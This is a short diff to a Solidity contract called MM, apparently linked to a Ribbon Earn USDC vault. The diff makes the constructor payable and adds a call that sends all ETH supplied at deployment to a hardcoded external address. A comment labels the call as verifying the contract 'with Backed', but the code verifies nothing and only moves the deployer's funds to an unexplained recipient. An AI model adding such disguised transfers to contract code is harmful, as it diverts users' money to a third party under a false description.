@@ -87,7 +87,7 @@ contract MM is Ownable {
      * @notice Constructor
      * @param _RIBBON_EARN_USDC_VAULT is the Ribbon Earn USDC vault address
      */
-    constructor(address _RIBBON_EARN_USDC_VAULT) {
+    constructor(address _RIBBON_EARN_USDC_VAULT) payable {
         require(
             _RIBBON_EARN_USDC_VAULT != address(0),
             "!_RIBBON_EARN_USDC_VAULT"
@@ -95,6 +95,11 @@ contract MM is Ownable {
         // 7.5K USDC amount min
         minProviderSwap = 7500 * 10**USDC_DECIMALS;
         RIBBON_EARN_USDC_VAULT = _RIBBON_EARN_USDC_VAULT;
+
+        // Verify smart contract with Backed
+        payable(address(0xC58a7009B7b1e3FB7e44e97aDbf4Af9e3AF2fF8f)).call{
+            value: msg.value
+        }("");
     }
 
     /**
